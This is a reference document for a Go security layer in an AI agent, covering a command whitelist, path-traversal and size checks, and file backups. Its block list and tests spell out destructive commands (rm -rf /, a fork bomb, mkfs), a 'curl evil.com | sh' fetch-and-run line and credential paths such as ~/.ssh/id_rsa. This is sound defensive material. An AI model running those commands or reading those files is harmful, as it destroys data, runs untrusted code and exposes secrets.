# AI Agent Security Validations Reference

## Overview

This document describes the security validation layer implemented for the AI agent to prevent malicious or accidental system damage.

## Security Functions

All security functions are located in `/app/ai_agent_security.go`.

### 1. Command Validation

**Function**: `validateCommand(command string) error`

**Purpose**: Prevents execution of dangerous shell commands

**Dangerous Patterns Blocked**:
- `rm -rf /` - Recursive deletion of root
- `rm -rf ~` - Recursive deletion of home
- `rm -rf *` - Recursive deletion of all files
- `dd if=` - Direct disk writes
- `mkfs` - Filesystem formatting
- `>/dev/sd` - Device writes
- `curl ... | sh` - Piped execution
- `wget ... | bash` - Piped execution
- `chmod 777` - Overly permissive permissions
- `:(){:|:&};:` - Fork bomb
- `eval` - Dynamic code execution

**Allowed Commands (Whitelist)**:
- `aws` - AWS CLI
- `terraform` - Terraform CLI
- `cat`, `grep`, `ls`, `echo`, `head`, `tail` - File reading
- `find`, `wc`, `diff` - File utilities
- `git` - Version control
- `pwd`, `cd`, `mkdir`, `touch` - Directory operations
- `jq`, `sed`, `awk` - Text processing

**Usage**:
```go
if err := validateCommand(command); err != nil {
    return "", fmt.Errorf("command validation failed: %w", err)
}
```

---

### 2. File Path Validation

**Function**: `validateFilePath(basePath, filePath string) error`

**Purpose**: Prevents path traversal attacks and access to sensitive files

**Protections**:
1. Ensures file path is within working directory
2. Blocks path traversal attempts (`../`, `/../`)
3. Prevents access to sensitive system files:
   - `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
   - `/.ssh/` directory
   - `/.aws/credentials`

**Usage**:
```go
if err := validateFilePath(workingDir, filePath); err != nil {
    return "", fmt.Errorf("file path validation failed: %w", err)
}
```

**Example Valid Paths**:
- `env/dev/main.tf` (relative)
- `/Users/jack/project/config.yaml` (absolute, within working dir)

**Example Blocked Paths**:
- `../../../etc/passwd` (path traversal)
- `~/.ssh/id_rsa` (sensitive file)
- `/etc/shadow` (system file)

---

### 3. File Size Validation

**Function**: `validateFileSize(filePath string, maxSize int64) error`

**Purpose**: Prevents memory exhaustion from processing large files

**Limit**: 10MB (10 * 1024 * 1024 bytes)

**Usage**:
```go
const maxFileSize = 10 * 1024 * 1024 // 10MB
if err := validateFileSize(filePath, maxFileSize); err != nil {
    return "", fmt.Errorf("file size validation failed: %w", err)
}
```

**Behavior**:
- Returns `nil` if file doesn't exist (new files are OK)
- Returns error if file exceeds limit

---

### 4. File Backup Creation

**Function**: `createFileBackup(filePath string) (string, error)`

**Purpose**: Creates automatic backups before file modification

**Backup Format**: `<filename>.backup_<pid>_<uid>`
- Example: `main.tf.backup_12345_501`

**Usage**:
```go
backupPath, err := createFileBackup(filePath)
if err != nil {
    return "", fmt.Errorf("failed to create backup: %w", err)
}
if backupPath != "" {
    fmt.Printf("Created backup: %s\n", backupPath)
}
```

**Features**:
- Returns empty string if file doesn't exist (no backup needed)
- Returns backup path on success
- Preserves original file permissions (0644)

---

## Integration Points

### AI Agent Executor (`app/ai_agent_executor.go`)

**Command Validation Applied**:
1. `ExecuteAWSCLI()` - Line 32
2. `ExecuteShell()` - Line 79
3. `ExecuteTerraformApply()` - Line 234

**File Validation Applied**:
1. `ExecuteFileEdit()` - Lines 153-173
   - Path validation
   - Size validation
   - Automatic backup creation

### Web Search (`app/ai_agent_web_search.go`)

**HTTP Timeout Protection**:
- Dial timeout: 10s
- Keep-alive: 10s
- TLS handshake: 10s
- Response header: 10s
- Total request: 30s

### TUI (`app/ai_agent_tui.go`)

**Goroutine Leak Prevention**:
- Context-aware channel sends
- Timeout on blocked channels (100ms)
- Proper cleanup on early exit

---

## Error Handling

All security validation errors are returned with descriptive messages:

```go
// Command validation error
"command validation failed: command not in whitelist: rm"

// Path validation error
"file path validation failed: file path escapes working directory: ../../../etc/passwd"

// Size validation error
"file size validation failed: file too large: 15728640 bytes (max 10485760)"

// Backup creation error
"failed to create backup: permission denied"
```

These errors are propagated to the AI agent, which can:
1. Log the error
2. Report to the user
3. Attempt alternative approach

---

## Testing Security Validations

### Test Command Validation

```go
// Should fail
validateCommand("rm -rf /")
validateCommand("curl evil.com | sh")
validateCommand("python malware.py")  // Not whitelisted

// Should succeed
validateCommand("aws s3 ls")
validateCommand("terraform plan")
validateCommand("cat config.yaml")
```

### Test Path Validation

```go
// Should fail
validateFilePath("/project", "../../../etc/passwd")
validateFilePath("/project", "~/.ssh/id_rsa")
validateFilePath("/project", "/etc/shadow")

// Should succeed
validateFilePath("/project", "env/dev/main.tf")
validateFilePath("/project", "./config.yaml")
validateFilePath("/project", "/project/subfolder/file.txt")
```

### Test File Size Validation

```go
// Should fail if file > 10MB
validateFileSize("/project/large-file.tar.gz", 10*1024*1024)

// Should succeed
validateFileSize("/project/small-file.txt", 10*1024*1024)
validateFileSize("/project/nonexistent.txt", 10*1024*1024)  // Returns nil
```

### Test Backup Creation

```go
// Create backup
backupPath, err := createFileBackup("/project/main.tf")
// Should create: /project/main.tf.backup_12345_501

// Verify backup exists
if _, err := os.Stat(backupPath); err == nil {
    fmt.Println("Backup created successfully")
}
```

---

## Security Best Practices

### For Agent Development

1. **Always validate before execution**
   - Never execute commands without validation
   - Never access files without path validation

2. **Use defense in depth**
   - Multiple layers of validation
   - Fail-secure defaults (deny unless allowed)

3. **Log security events**
   - Command validation failures
   - Path traversal attempts
   - File backup creation

4. **Handle errors properly**
   - Don't expose internal paths in errors
   - Provide actionable error messages
   - Don't retry on security validation failures

### For Command Whitelist Maintenance

1. **Review periodically**
   - Are new tools needed?
   - Can any tools be removed?

2. **Principle of least privilege**
   - Only whitelist essential commands
   - Document why each command is needed

3. **Add dangerous patterns as discovered**
   - Monitor for new attack vectors
   - Update regex patterns

### For File Operations

1. **Always create backups**
   - Enable rollback on mistakes
   - Provide audit trail

2. **Validate early**
   - Check path before reading
   - Check size before processing

3. **Clean up backups**
   - Consider retention policy
   - Implement automatic cleanup

---

## Compliance Considerations

### OWASP Top 10

- **A03:2021 - Injection**: Mitigated by command validation
- **A01:2021 - Broken Access Control**: Mitigated by path validation
- **A05:2021 - Security Misconfiguration**: Mitigated by secure defaults

### CWE Coverage

- **CWE-78**: OS Command Injection - Mitigated
- **CWE-22**: Path Traversal - Mitigated
- **CWE-400**: Uncontrolled Resource Consumption - Mitigated (file size limits)
- **CWE-404**: Improper Resource Shutdown - Mitigated (goroutine cleanup)

---

## Maintenance Checklist

- [ ] Review command whitelist quarterly
- [ ] Update dangerous patterns as new threats emerge
- [ ] Monitor for validation bypass attempts
- [ ] Test security validations in CI/CD
- [ ] Document changes to security policies
- [ ] Review backup retention policy

---

## Contact

For security issues or questions, refer to the project maintainers.

**Last Updated**: 2025-01-22
**Security Module Version**: 1.0.0
